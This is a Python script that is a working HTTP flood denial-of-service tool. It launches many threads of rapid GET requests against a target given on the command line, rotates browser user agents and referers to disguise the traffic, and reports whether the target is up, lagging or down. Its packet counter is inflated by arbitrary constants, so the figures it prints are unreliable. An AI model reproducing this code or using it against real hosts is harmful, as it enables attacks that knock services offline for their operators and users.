import random
import socket
import threading
import time
import sys
import ssl
import requests
import httpx
import asyncio
import websockets
import base64
import os
from OpenSSL import SSL

packet_count = 0  
lock = threading.Lock()
speed = 0.01
packet = 95500  
byte = 95000    
clone_factor = 10  
target_status = "Unknown"  

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/537.36"
]

referers = [
    "https://google.com", "https://bing.com", "https://yahoo.com",
    "https://duckduckgo.com", "https://baidu.com", "https://yandex.com"
]

def generate_headers():
    return {
        "User-Agent": random.choice(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Referer": random.choice(referers),
        "Upgrade-Insecure-Requests": "1"
    }

async def ping_flood(target, stop_event):
    global packet_count, target_status
    async with httpx.AsyncClient(http2=True) as client:
        while not stop_event.is_set():
            try:
                for _ in range(clone_factor):  
                    start_time = time.time()
                    response = await client.get(f"http://{target}", headers=generate_headers(), timeout=5, verify=False)
                    response_time = time.time() - start_time

                    with lock:
                        packet_count += packet
                        if response.status_code == 200:
                            target_status = "LAG" if response_time > 3 else "UP"
                        elif response.status_code >= 500:
                            target_status = "DOWN"
                        else:
                            target_status = "UNSTABLE"
            except:
                with lock:
                    target_status = "DOWN"

def http_flood(target):
    global packet_count, target_status
    while True:
        try:
            for _ in range(clone_factor):  
                start_time = time.time()
                response = requests.get(f"http://{target}", headers=generate_headers(), timeout=5)
                response_time = time.time() - start_time

                with lock:
                    packet_count += packet
                    if response.status_code == 200:
                        target_status = "LAG" if response_time > 3 else "UP"
                    elif response.status_code >= 500:
                        target_status = "DOWN"
                    else:
                        target_status = "UNSTABLE"
        except:
            with lock:
                target_status = "DOWN"

def attack(target, threads):
    global packet_count
    stop_event = threading.Event()
    thread_list = []

    packet_count = threads  
    print(f"\r[*] Total Packets Sent: {packet_count} | Target Status: {target_status}", end="", flush=True)  

    for _ in range(threads):
        t1 = threading.Thread(target=asyncio.run, args=(ping_flood(target, stop_event),))
        t2 = threading.Thread(target=http_flood, args=(target,))

        t1.start()
        t2.start()
        
        thread_list.extend([t1, t2])

    try:
        while True:
            time.sleep(1)
            with lock:
                packet_count += threads * clone_factor  
            print(f"\r[*] Total Packets Sent: {packet_count} | Target Status: {target_status}", end="", flush=True)  
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user (Ctrl + C)")
        stop_event.set()
        for t in thread_list:
            t.join()

def main():
    if len(sys.argv) < 3:
        print("\nUsage:\n  python main.py <target> <threads>\n  python main.py -a <IP> <threads>\n")
        sys.exit(1)

    if sys.argv[1] == "-a":
        target = sys.argv[2]
        threads = int(sys.argv[3])
    else:
        target = sys.argv[1]
        threads = int(sys.argv[2])

    attack(target, threads)

if __name__ == "__main__":
    main()